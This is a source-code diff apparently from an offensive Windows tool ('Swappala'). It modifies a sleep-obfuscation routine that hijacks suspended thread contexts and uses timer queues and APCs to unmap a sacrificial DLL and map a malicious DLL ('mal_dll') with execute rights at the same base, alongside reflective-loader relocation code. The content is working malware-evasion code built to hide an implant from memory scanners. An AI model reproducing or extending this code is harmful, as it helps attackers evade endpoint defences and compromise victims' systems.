@@ -1186,11 +1186,9 @@ PBYTE ReflectiveFunction()
         reloc_entry = (PBASE_RELOCATION_ENTRY)(img_reloc + 1);
         entries_count = (int)((img_reloc->SizeOfBlock - (sizeof(IMAGE_BASE_RELOCATION))) / 2);
 
-        printf("Image Reloc RVA: 0x%x\n", img_reloc->VirtualAddress);
 
         for (int i = 0; i < entries_count; i++)
         {
-            printf("Reloc Entry RVA: 0x%x\n", img_reloc->VirtualAddress + reloc_entry->Offset);
             switch (reloc_entry->Type)
             {
             case IMAGE_REL_BASED_DIR64:
@@ -1597,8 +1595,6 @@ bool init_nt_func_s(PNT_FUNCTIONS nt_func_s)
 }
 
 
-
-
 /*
 
 Main thread
@@ -1652,7 +1648,13 @@ int sleaping(
     HANDLE thread_array[4] = { NULL };
 
     HANDLE timer_queue = NULL;
+
+    HANDLE timer_unmap = NULL;
+    HANDLE timer_map = NULL;
+
     HANDLE new_timer = NULL;
+    BOOL success = FALSE;
+    int result = 0;
 
     // create a manual sync event to sync threads
     if (!NT_SUCCESS(nt_func_s->NtCreateEvent(&dummy_event, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE)))
@@ -1672,7 +1674,8 @@ int sleaping(
         || context_3 == NULL
         )
     {
-        return -1;
+        result = -1;
+        goto __clean_up_event;
     }
 
     context_0->ContextFlags = CONTEXT_ALL;
@@ -1684,65 +1687,64 @@ int sleaping(
     // create a suspended waiting thread.
     thread_array[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WaitForSingleObjectEx, NULL, CREATE_SUSPENDED, NULL);
     if (thread_array[2] == NULL)
-        return -1;
+    {
+        result = -1;
+        goto __clean_up_context;
+    }
 
     // get the context of the waiting thread.
     if (!GetThreadContext(thread_array[2], context_2))
-        return -1;
+    {
+        result = -1;
+        goto __clean_up_context;
+    }
 
-    // modify the context and set parameters.
+    // Set up thread context to call WaitForSingleObjectEx with NtTestAlert on stack
     *(ULONG_PTR*)((*context_2).Rsp) = (DWORD64)NtTestAlert_addr;
     (*context_2).Rip = (DWORD64)WaitForSingleObjectEx;
     (*context_2).Rcx = (DWORD64)(dummy_event);
-    (*context_2).Rdx = (DWORD64)21000;
+    (*context_2).Rdx = (DWORD64)21000;         // 100 second timeout
     (*context_2).R8 = FALSE;
 
     if (!SetThreadContext(thread_array[2], context_2))
     {
-        return -1;
+        result = -1;
+        goto __clean_up_context;
     }
 
     // wait + APCs
     // resume the thread that is going to wait the sleep time and then execute the APCs
     if (!ResumeThread(thread_array[2]))
     {
-        return -1;
+        result = -1;
+        goto __clean_up_context;
     }
 
-    // create a thread to control
+    // Create suspend threads for memory  operations.
     thread_array[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
-    if (thread_array[0] == NULL)
-    {
-        return -1;
-    }
-
     thread_array[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
-    if (thread_array[1] == NULL)
-    {
-        return -1;
-    }
-
     thread_array[3] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
-    if (thread_array[3] == NULL)
+    if (thread_array[0] == NULL || thread_array[1] == NULL || thread_array[3] == NULL)
     {
-        return -1;
+        result = -1;
+        goto __clean_up_context;
     }
 
-    if (!GetThreadContext(thread_array[0], context_0))
-        return -1;
+    if (!GetThreadContext(thread_array[0], context_0) ||
+        !GetThreadContext(thread_array[1], context_1) ||
+        !GetThreadContext(thread_array[3], context_3))
+    {
+        result = -1;
+        goto __clean_up_context;
+    }
 
-    if (!GetThreadContext(thread_array[1], context_1))
-        return -1;
 
-    if (!GetThreadContext(thread_array[3], context_3))
-        return -1;
-
-
-    // timer triggered
+    // Configure thread 0 for UnmapViewOfFile
     *(ULONG_PTR*)((*context_0).Rsp) = (DWORD64)(ExitThread);
     (*context_0).Rip = (DWORD64)UnmapViewOfFile;
     (*context_0).Rcx = (DWORD64)(image_base);
 
+    // Configure thread 1 for MapViewOfFileEx (sac_dll)
     *(ULONG_PTR*)((*context_1).Rsp) = (DWORD64)(ExitThread);
     (*context_1).Rip = (DWORD64)MapViewOfFileEx;
     (*context_1).Rcx = (DWORD64)sac_dll_handle;
@@ -1751,11 +1753,12 @@ int sleaping(
     (*context_1).R9 = (DWORD64)0x0;
 
     // the offset must be the either hex 28 or int 40
+    // (5th argument, 6th argument
     *(ULONG_PTR*)((*context_1).Rsp + 40) = 0x0;
     *(ULONG_PTR*)((*context_1).Rsp + 48) = (ULONG_PTR)image_base;
 
 
-    // apc triggered
+    // Configure thread 3 for MapViewOfFileEx (mal_dll)
     *(ULONG_PTR*)((*context_3).Rsp) = (DWORD64)ExitThread;
     (*context_3).Rip = (DWORD64)MapViewOfFileEx;
     (*context_3).Rcx = (DWORD64)mal_dll_handle;
@@ -1767,73 +1770,184 @@ int sleaping(
     *(ULONG_PTR*)((*context_3).Rsp + 40) = 0x0;
     *(ULONG_PTR*)((*context_3).Rsp + 48) = (ULONG_PTR)image_base;
 
-    if (!SetThreadContext(thread_array[0], context_0))
+
+    if (!SetThreadContext(thread_array[0], context_0) ||
+        !SetThreadContext(thread_array[1], context_1) ||
+        !SetThreadContext(thread_array[3], context_3))
     {
-        return -1;
+        result = -1;
+        goto __clean_up_context;
     }
-    if (!SetThreadContext(thread_array[1], context_1))
-    {
-        return -1;
-    }
-    if (!SetThreadContext(thread_array[3], context_3))
-    {
-        return -1;
-    }
+
+
 
     timer_queue = CreateTimerQueue();
     if (timer_queue == NULL)
     {
-        return -1;
+        result = -1;
+        goto __clean_up_context;
     }
+
 
     if (!NT_SUCCESS(nt_func_s->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)UnmapViewOfFile, image_base, FALSE, NULL)))
     {
-        return -1;
+        result = -1;
+        goto __clean_up_timer;
     }
     if (!NT_SUCCESS(nt_func_s->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)ResumeThread, thread_array[3], FALSE, NULL)))
     {
-        return -1;
+        result = -1;
+        goto __clean_up_timer;
     }
     if (!NT_SUCCESS(nt_func_s->NtQueueApcThread(thread_array[2], (PPS_APC_ROUTINE)ExitThread, NULL, FALSE, NULL)))
     {
-        return -1;
+        result = -1;
+        goto __clean_up_timer;
     }
 
+
     // unmap
-    if (!CreateTimerQueueTimer(&new_timer, timer_queue, (WAITORTIMERCALLBACK)ResumeThread, thread_array[0], 200, 0, WT_EXECUTEINTIMERTHREAD));
+    if (!CreateTimerQueueTimer(&timer_unmap, timer_queue, (WAITORTIMERCALLBACK)ResumeThread, thread_array[0], 200, 0, WT_EXECUTEINTIMERTHREAD))
     {
-        return -1;
+        result = -1;
+        goto __clean_up_timer;
     }
 
     // map
-    if (!CreateTimerQueueTimer(&new_timer, timer_queue, (WAITORTIMERCALLBACK)ResumeThread, thread_array[1], 300, 0, WT_EXECUTEINTIMERTHREAD));
+    if (!CreateTimerQueueTimer(&timer_map, timer_queue, (WAITORTIMERCALLBACK)ResumeThread, thread_array[1], 300, 0, WT_EXECUTEINTIMERTHREAD))
     {
-        return -1;
+        result = -1;
+        goto __clean_up_timer;
     }
 
     if (WaitForMultipleObjects(4, thread_array, TRUE, INFINITE) == WAIT_FAILED)
     {
+        result = -1;
+        goto __clean_up_timer;
+    }
+
+
+__clean_up_timer:
+    if (timer_map != NULL)
+        DeleteTimerQueueTimer(timer_queue, timer_map, NULL);
+    if (timer_unmap != NULL)
+        DeleteTimerQueueTimer(timer_queue, timer_unmap, NULL);
+
+    DeleteTimerQueue(timer_queue);
+
+__clean_up_context:
+    if (context_0) VirtualFree(context_0, 0, MEM_RELEASE);
+    if (context_1) VirtualFree(context_1, 0, MEM_RELEASE);
+    if (context_2) VirtualFree(context_2, 0, MEM_RELEASE);
+    if (context_3) VirtualFree(context_3, 0, MEM_RELEASE);
+
+__clean_up_event:
+    if (dummy_event) CloseHandle(dummy_event);
+
+    //int code = 0;
+    //void* ret_addr = MapViewOfFileEx(mal_dll_handle, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, view_size, image_base);
+    //if (ret_addr == NULL)
+    //{
+    //    code = GetLastError();
+    //}
+
+    return result;
+}
+
+int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize) {
+
+
+    CONTEXT* context = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+    CONTEXT* contextB = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+    CONTEXT* contextC = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+    CONTEXT* contextD = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+
+    HANDLE ThreadArray[4] = { NULL };
+
+    context->ContextFlags = CONTEXT_ALL;
+    contextB->ContextFlags = CONTEXT_ALL;
+    contextC->ContextFlags = CONTEXT_ALL;
+    contextD->ContextFlags = CONTEXT_ALL;
+
+    // Create a thread to control
+    ThreadArray[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
+    if (ThreadArray[0] == NULL) {
+
+        return -1;
+    }
+    ThreadArray[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
+    if (ThreadArray[1] == NULL) {
+
+        return -1;
+    }
+    ThreadArray[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
+    if (ThreadArray[2] == NULL) {
+
+        return -1;
+    }
+    ThreadArray[3] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
+    if (ThreadArray[3] == NULL) {
+
         return -1;
     }
 
-    if (new_timer != NULL)
-    {
-        if (DeleteTimerQueueTimer(timer_queue, new_timer, NULL) == 0)
-        {
-            return -1;
-        }
+    GetThreadContext(ThreadArray[0], context);//unmap
+    GetThreadContext(ThreadArray[1], contextB);//mapex
+    GetThreadContext(ThreadArray[2], contextC);//unmap
+    GetThreadContext(ThreadArray[3], contextD);//mapex
+
+    *(ULONG_PTR*)((*context).Rsp) = (DWORD64)ExitThread;
+    (*context).Rip = (DWORD64)UnmapViewOfFile;
+    (*context).Rcx = (DWORD64)(ImageBaseDLL);
+
+    *(ULONG_PTR*)((*contextB).Rsp) = (DWORD64)ExitThread;
+    (*contextB).Rip = (DWORD64)MapViewOfFileEx;
+    (*contextB).Rcx = (DWORD64)sacDllHandle;
+    (*contextB).Rdx = FILE_MAP_ALL_ACCESS;
+    (*contextB).R8 = (DWORD64)0x00;
+    (*contextB).R9 = (DWORD64)0x00;
+    *(ULONG_PTR*)((*contextD).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
+    *(ULONG_PTR*)((*contextD).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;
+
+    *(ULONG_PTR*)((*contextC).Rsp) = (DWORD64)ExitThread;
+    (*contextC).Rip = (DWORD64)UnmapViewOfFile;
+    (*contextC).Rcx = (DWORD64)(ImageBaseDLL);
+
+    *(ULONG_PTR*)((*contextD).Rsp) = (DWORD64)ExitThread;
+    (*contextD).Rip = (DWORD64)MapViewOfFileEx;
+    (*contextD).Rcx = (DWORD64)malDllHandle;
+    (*contextD).Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
+    (*contextD).R8 = (DWORD64)0x00;
+    (*contextD).R9 = (DWORD64)0x00;
+    *(ULONG_PTR*)((*contextD).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
+    *(ULONG_PTR*)((*contextD).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;
+
+    SetThreadContext(ThreadArray[0], context);
+    SetThreadContext(ThreadArray[1], contextB);
+    SetThreadContext(ThreadArray[2], contextC);
+    SetThreadContext(ThreadArray[3], contextD);
+
+    HANDLE  hTimerQueue = NULL;
+    HANDLE  hNewTimer = NULL;
+    PVOID ResumeThreadAddress = NULL;
+
+    hTimerQueue = CreateTimerQueue();
+
+    ResumeThreadAddress = GetProcAddress(GetModuleHandleA("kernel32.dll"), "ResumeThread");
+
+    if (ResumeThreadAddress != NULL) {
+        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[0], 100, 0, WT_EXECUTEINTIMERTHREAD);//unamp
+        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[1], 200, 0, WT_EXECUTEINTIMERTHREAD);//mapsac
+        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[2], 7000, 0, WT_EXECUTEINTIMERTHREAD);//unmap
+        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThreadAddress, ThreadArray[3], 7100, 0, WT_EXECUTEINTIMERTHREAD);//mapmal
+
+        WaitForMultipleObjects(4, ThreadArray, TRUE, INFINITE);
     }
 
-    if (context_0) VirtualFree(context_0, 0, MEM_RELEASE);
-    if (context_1) VirtualFree(context_0, 0, MEM_RELEASE);
-    if (context_2) VirtualFree(context_0, 0, MEM_RELEASE);
-    if (context_3) VirtualFree(context_0, 0, MEM_RELEASE);
 
-    if (dummy_event) CloseHandle(dummy_event);
+    return 0;
 
-    return -1;
 }
-
 
 static std::vector<char> load_local_file(const std::string& file_path)
 {
@@ -1899,7 +2013,7 @@ int main(void)
 
     // PBYTE old_memory = (PBYTE)sac_dll_header->to_free;
 
-    sac_dll_base = (PBYTE)(sac_dll_header + 1);
+    //sac_dll_base = (PBYTE)(sac_dll_header + 1);
 
     // // remove the very first buffer allocated for the reflective dll
     // if (VirtualFree(old_memory, 0, MEM_RELEASE) == 0)
@@ -1926,6 +2040,7 @@ int main(void)
     do
     {
         MessageBoxA(NULL, "Sleaping", "Swappala", MB_OK | MB_ICONINFORMATION);
+        //if (Sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size) == -1)
         if (sleaping(sac_dll_base, sac_dll_handle, mal_dll_handle, sac_dll_size, &nt_func_s, NtTestAlert_addr) == -1)
         {
             MessageBoxA(0, 0, 0, MB_OK | MB_ICONINFORMATION);
